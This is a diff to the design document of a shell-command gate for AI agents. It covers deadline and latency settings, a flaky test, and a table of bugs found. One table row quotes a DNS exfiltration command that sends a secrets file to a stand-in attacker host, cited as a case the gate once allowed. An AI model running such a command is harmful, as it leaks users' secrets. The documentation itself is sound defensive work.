@@ -282,9 +282,18 @@ are the `stat` and `readlink` behind path resolution, cached on the (program,
 directory) pairs an agent hits repeatedly — 99.9 % hit rate across the corpus.
 What remains is parsing and matching, both linear in command length.
 
-That is why the budget is a **deadline** rather than a timeout on a worker: no
+That is why the limit is a **deadline** rather than a timeout on a worker: no
 step can block, so a check between phases bounds the whole thing, and there is
 no thread to cancel.
+
+There are two numbers and they are not the same. The **budget**, 10 ms
+(`LATENCY_BUDGET`), is what this document promises and `shellguard bench` asserts.
+The **deadline**, 100 ms (`DEFAULT_DEADLINE`), is where the gate stops and denies.
+The deadline is a safety valve: it exists so adversarial input cannot make
+evaluation slow enough to be a bypass, and the worst such input measured takes
+about 2 ms. It sits at ten times the budget because it is wall-clock time and so
+also counts every moment the thread was not scheduled. It used to equal the budget,
+and on a busy machine it then fired on ordinary commands (§ 12).
 
 Measured, release build, M2 MacBook Air, 58 000 samples over 145 commands:
 
@@ -665,20 +674,23 @@ running as the same user outside the sandbox can rewrite it. It also cannot
 record a command that was run some other way, which is why every file's header
 says so.
 
-**The gate's deadline fails closed when the machine is busy.** The gate denies
-when it exceeds its 10 ms budget — by design, and correct for adversarial input.
-Wall-clock time also counts every moment the thread was not scheduled, so on a
-loaded or cold machine a benign command is occasionally refused. Measured, not
-inferred: 1 of 414 identical evaluations of `basename $(pwd)` returned `deny` with
+**The deadline used to fire on scheduling noise.** The gate denies when it exceeds
+its deadline — by design, and correct for adversarial input — and the deadline used
+to be 10 ms of wall-clock time. That also counts every moment the thread was not
+scheduled, so on a busy or cold machine a benign command was occasionally refused.
+Measured: 1 of 414 identical evaluations of `basename $(pwd)` returned `deny` with
 `evaluation exceeded its 10ms budget after 30.49ms`, and was `confine` the other
-five times. With a load average of 176 — this repository's own stress tests left
-the machine there — it is common. This is very probably what the two earlier
-"benign command came back without having run" test failures were (consistent with
-them, not proven for them). Tests that are about *which* verdict the rules give
-now use a generous deadline, or skip an incomplete decision, so they no longer
-measure the machine. **The default has deliberately not been changed**: raising it
-is a decision about the headline 10 ms claim (typical p99 is 13 µs; the deadline is
-a safety valve, not the typical cost). Options are in MITIGATIONS.md.
+five times. This is very probably what the two earlier "benign command came back
+without having run" test failures were (consistent with them, not proven for them).
+
+The default is now **100 ms**, separate from the 10 ms latency budget (§ 5). The
+justification is that one measurement: a 30 ms overrun refused by the old limit is
+comfortably inside the new one, and the worst adversarial input takes about 2 ms,
+so the valve still catches what it is for. It is *not* demonstrated under load: a
+16-way CPU-saturation run did not trigger the old limit either (0 of 276), because
+fair scheduling favours short-lived processes — the stall was seen only when the
+machine was thrashing at a load average of 176. A wall-clock limit of any length can
+still be exceeded by a long enough stall, and when it is the answer is still `deny`.
 
 **On Linux, "no network" means "no TCP".** Read from the code; there is no Linux
 host here to run it. Landlock's network rules (ABI 4–6) cover TCP `bind` and
@@ -762,7 +774,7 @@ tests that found them.
 | `shellguard run` silently ignored `--policy` while `eval` honoured it | reading `cmd_run` while designing reload |
 | an unknown program was laundered from `confine` to `allow` by any allowed neighbour (`tool; ls`), and `nslookup $(cat secrets.txt).evil.example` came back `allow` | asking what the gate said about the exfiltration commands I was about to classify |
 | `git remote add` and `set-url` were `allow` as "read-only inspection" | a corpus expectation I got wrong |
-| an unexplained test flake was the gate's own 10 ms deadline firing on a busy machine | repeating 414 identical evaluations and printing the reason |
+| an unexplained test flake was the gate's own 10 ms deadline firing on a busy machine; the default was a second copy of the constant nothing read | repeating 414 identical evaluations and printing the reason |
 | a network probe "proved" the sandbox blocked TCP while nothing was listening (the listener had crashed) | printing what the listeners received, and adding an unsandboxed control |
 | `open -a NoSuchApp` "showed" the sandbox reached LaunchServices; it resolves app names locally and answers the same either way | the deny I tried changed nothing, and broke `git` |
 | a benchmark on a machine at load average 176 showed a 200× regression that was not there | "parse only" got slower too, and I had not touched the parser |
